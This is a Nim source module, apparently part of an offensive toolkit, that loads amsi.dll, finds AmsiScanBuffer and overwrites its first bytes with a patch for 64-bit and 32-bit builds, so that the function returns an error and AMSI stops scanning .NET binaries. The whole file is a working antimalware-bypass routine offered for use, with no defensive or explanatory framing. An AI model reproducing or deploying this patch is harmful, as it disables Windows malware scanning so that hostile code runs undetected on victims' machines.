import dynlib
import ../utils/utils
import ../utils/mem_helper


#[
  This snippet tries to Load the amsi.dll
  and patches the required functions. This
  will ultimatley stopp AMSI from scanning
  .NET binaries.
]#


when defined amd64:
    const patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
elif defined i386:
    const patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]

proc bypassAmsi*(): bool =
  var
      amsi: LibHandle
      cs:  pointer
      disabled: bool = false

  # loadLib does the same thing that the dynlib
  # pragma does and is the equivalent of LoadLibrary()
  # on windows. it also returns nil if something goes
  # wrong meaning we can add some checks in the code
  # to make sure everything's ok (which you can't really
  # do well when using LoadLibrary() directly through winim)
  amsi = loadLib("amsi")
  if isNil(amsi):
    DBG("[X] Failed to load amsi.dll")
    return disabled

  cs = amsi.symAddr("AmsiScanBuffer") # equivalent of GetProcAddress()
  if isNil(cs):
    DBG("[X] Failed to get the address of 'AmsiScanBuffer'")
    return disabled

  # Does the patching writing to
  # memory for us
  return protectAndWrite(unsafeAddr(patch), patch.len, cs)
